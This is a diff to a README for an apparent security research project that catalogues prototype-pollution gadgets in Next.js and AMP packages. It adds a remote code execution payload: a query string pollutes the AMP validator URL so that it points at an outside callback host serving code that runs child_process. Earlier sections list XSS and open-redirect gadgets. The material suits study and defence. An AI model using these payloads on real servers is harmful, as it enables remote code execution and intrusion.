@@ -18,19 +18,29 @@ npm start
 
 > Lot of unexplored surface. If you find any gadgets, send a pull request :)
 
-| Name                              | Description                                        | Type                          | Package                         | Completed |
-| --------------------------------- | -------------------------------------------------- | ----------------------------- | ------------------------------- | :-------: |
-| [AMP first look](#amp-first-look) | via `ampUrlPrefix` in `ampOptimizer.transformHtml` | Persistent XSS + Partial SSRF | `@ampproject/toolbox-optimizer` |     ✔     |
-| [Redirect SSR](#redirect-ssr)     | via `redirect.destination` in `getServerSideProps` | Open Redirect                 | `next`                          |     ✔     |
-| [404 SSR](#404-ssr)               | via `notFound` in `getServerSideProps`             | Permanant 404                 | `next`                          |     ✔     |
-| More AMP                          |                                                    |                               |                                 |           |
-| React Server Components           |                                                    |                               |                                 |           |
-| Image & Font Optimization         |                                                    |                               |                                 |           |
-| API & Middlewares                 |                                                    |                               |                                 |           |
-| Router                            |                                                    |                               |                                 |           |
-| Prisma                            |                                                    |                               |                                 |           |
+| Name                          | Description                                        | Type                          | Package                         | Completed |
+| ----------------------------- | -------------------------------------------------- | ----------------------------- | ------------------------------- | :-------: |
+| [AMP RCE](#amp-rce)           | via `validator` in `Validator`                     | Remote Code Execution         | `amp-validator`                 |     ✔     |
+| [AMP XSS](#amp-xss)           | via `ampUrlPrefix` in `ampOptimizer.transformHtml` | Persistent XSS + Partial SSRF | `@ampproject/toolbox-optimizer` |     ✔     |
+| [Redirect SSR](#redirect-ssr) | via `redirect.destination` in `getServerSideProps` | Open Redirect                 | `next`                          |     ✔     |
+| [404 SSR](#404-ssr)           | via `notFound` in `getServerSideProps`             | Permanant 404                 | `next`                          |     ✔     |
+| More AMP                      |                                                    |                               |                                 |           |
+| React Server Components       |                                                    |                               |                                 |           |
+| Image & Font Optimization     |                                                    |                               |                                 |           |
+| API & Middlewares             |                                                    |                               |                                 |           |
+| Router                        |                                                    |                               |                                 |           |
+| Prisma                        |                                                    |                               |                                 |           |
 
-## AMP first look
+## AMP RCE
+
+> Only on `dev` server
+
+```sh
+# Hosted payload: (this.constructor.constructor("return process.mainModule.require('child_process')")()).execSync('calc')
+/vulnerable?amp=1&__proto__.amp=hybrid&__proto__.validator=https://xss-callback.pwnfunction.repl.co/
+```
+
+## AMP XSS
 
 Persistent Cross-Site Scripting via `ampUrlPrefix` in `ampOptimizer.transformHtml`.
 
@@ -105,6 +115,19 @@ async transformHtml(t, e) {
 
 > 📝 Note: In `next.config.js`, we skip validation `skipValidation: true`.
 > This is to disable `SeparateKeyframes` (`fn 1053`) - `@ampproject/toolbox-optimizer/index.js` throws `filter on undefined` due to prototype pollution. (Lazy fix)
+
+```js
+// next.config.js
+module.exports = {
+  reactStrictMode: true,
+  experimental: {
+    amp: {
+      optimizer: {},
+      skipValidation: true,
+    },
+  },
+};
+```
 
 ## Redirect SSR
 
